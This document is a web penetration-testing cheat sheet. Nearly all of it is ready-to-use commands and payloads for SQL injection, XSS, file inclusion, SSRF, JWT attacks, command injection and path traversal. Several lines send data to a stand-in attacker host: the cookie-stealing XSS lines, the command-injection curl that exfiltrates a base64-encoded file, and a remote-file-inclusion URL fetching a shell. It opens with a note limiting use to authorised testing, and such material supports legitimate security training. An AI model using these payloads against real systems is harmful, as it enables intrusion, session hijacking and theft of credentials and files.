# 🌐 Web Application Security

> Web vulnerabilities are the most prevalent attack surface in real-world pentests and bug bounty programmes. Master the classics and stay curious.

> **Grey Hat context:** The techniques here apply directly to authorised web application penetration testing, bug bounty hunting, and red team initial access. Always operate within defined scope and with written authorisation.

---

## Recon & Enumeration

Always start here before trying any attacks.

```bash
# Discover directories and files
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Discover virtual hosts / subdomains
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt

# Technology fingerprinting
whatweb http://target.com
curl -s http://target.com | grep -i "generator\|powered"

# Check robots.txt and sitemap
curl http://target.com/robots.txt
curl http://target.com/sitemap.xml

# Find JavaScript files for endpoints/secrets
ffuf -u http://target.com/FUZZ.js -w /usr/share/wordlists/dirb/common.txt
```

---

## SQL Injection (SQLi)

### Manual Detection
```
# Classic test payloads
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
' OR 1=1#
admin'--
```

### Error-Based
```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
```

### Boolean-Based Blind
```sql
' AND 1=1--   -- true
' AND 1=2--   -- false
```

### Time-Based Blind
```sql
' AND SLEEP(5)--           -- MySQL
'; WAITFOR DELAY '0:0:5'-- -- MSSQL
```

### UNION-Based
```sql
-- First, find number of columns
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Then extract data
' UNION SELECT username,password FROM users--
```

### sqlmap
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1" --dbs

# With POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs

# Dump a table
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# With cookie
sqlmap -u "http://target.com/page" --cookie="session=abc123" --dbs
```

---

## Cross-Site Scripting (XSS)

### Basic Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
```

### Steal Cookies
```html
<script>document.location='http://attacker.com/?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
```

### Filter Bypass
```html
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

---

## Local/Remote File Inclusion (LFI/RFI)

```
# LFI classic
http://target.com/page?file=../../../../etc/passwd

# LFI with null byte (older PHP)
http://target.com/page?file=../../../../etc/passwd%00

# LFI via PHP wrappers
http://target.com/page?file=php://filter/convert.base64-encode/resource=index.php
http://target.com/page?file=php://input   (POST body as PHP)

# Log poisoning via LFI
# 1. Inject PHP in User-Agent
# 2. Include the access log
http://target.com/page?file=../../../../var/log/apache2/access.log

# RFI (if allow_url_include is on)
http://target.com/page?file=http://attacker.com/shell.txt
```

---

## Server-Side Request Forgery (SSRF)

```
# Access internal services
http://target.com/fetch?url=http://localhost/admin
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/  (AWS metadata)
http://target.com/fetch?url=http://192.168.1.1/

# SSRF filter bypass
http://target.com/fetch?url=http://127.1/
http://target.com/fetch?url=http://0177.0.0.1/   (octal)
http://target.com/fetch?url=http://0x7f000001/    (hex)

# SSRF to internal port scan
http://target.com/fetch?url=http://localhost:22/
http://target.com/fetch?url=http://localhost:3306/
```

---

## Authentication Bypass

### Default Credentials
```
admin:admin
admin:password
admin:123456
guest:guest
```

### JWT Attacks
```bash
# Decode JWT (base64 each section)
echo "eyJ..." | base64 -d

# Algorithm confusion: change "alg": "RS256" → "HS256", sign with public key

# "alg": "none" attack
# Set algorithm to none and remove signature

# Crack JWT secret
hashcat -m 16500 jwt.txt wordlist.txt
```

### OAuth / OIDC
- State parameter CSRF
- Redirect URI manipulation
- Token leakage in Referer

---

## Command Injection

```bash
# Test payloads
; id
| id
`id`
$(id)
& id
&& id

# Blind (time-based)
; sleep 5

# Exfiltration
; curl http://attacker.com/$(id)
; curl http://attacker.com/?x=$(cat /flag | base64)
```

---

## Path Traversal

```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd
```

---

## Insecure Deserialization

- **PHP**: `unserialize()` — look for magic methods (`__wakeup`, `__destruct`)
- **Python**: `pickle.loads()` — craft malicious pickle
- **Java**: ObjectInputStream — ysoserial gadget chains
- **Node.js**: `node-serialize` — `_$$ND_FUNC$$_` function notation

---

## Common HTTP Headers to Manipulate

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
Referer: http://target.com/admin
Host: internal.target.com
```

---

## Tools Summary

| Task | Tool |
|---|---|
| Proxy / intercept | Burp Suite |
| Directory fuzzing | `ffuf`, `gobuster` |
| SQLi automation | `sqlmap` |
| Vulnerability scan | `nikto` |
| Quick HTTP requests | `curl` |

---

## Resources

- [PortSwigger Web Security Academy](https://portswigger.net/web-security) — best free web labs
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — payload cheatsheets
- [HackTricks Web](https://book.hacktricks.xyz/pentesting-web) — technique reference
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
